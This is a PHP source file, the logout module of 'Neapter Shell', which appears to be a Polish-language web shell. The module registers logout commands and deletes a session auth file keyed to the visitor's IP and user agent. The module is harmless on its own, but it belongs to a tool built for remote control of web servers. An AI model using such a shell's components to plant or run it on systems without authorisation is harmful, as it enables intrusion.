<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Zmienianie uprawnien dla pliku
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleLogout extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array(
            'logout',
            'quit',
            'exit'
        );
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        /**
         * Wersja Data Autor
         */
        return '1.0.0 2016-02-26 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
exit, quit, logout - Wylogowanie z shella

    Użycie:
        logout
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {

        /**
         * Sciezka do pliku
         */
        $sFilepath = $this->sTmp . '/' . $this->sPrefix . md5(Request::getServer('REMOTE_ADDR') . Request::getServer('USER_AGENT')) . '_auth';

        /**
         * Czy plik z autoryzacja istnieje
         */
        if (is_file($sFilepath)) {
            /**
             * Usuwanie pliku
             */
            if (unlink($sFilepath)) {
                echo 'Zostałeś wylogowany';
                exit;
            } else {
                echo 'Nie zostałeś wylogowany';
                exit;
            }
        }

        echo 'See you (:';
        exit;
    }

}
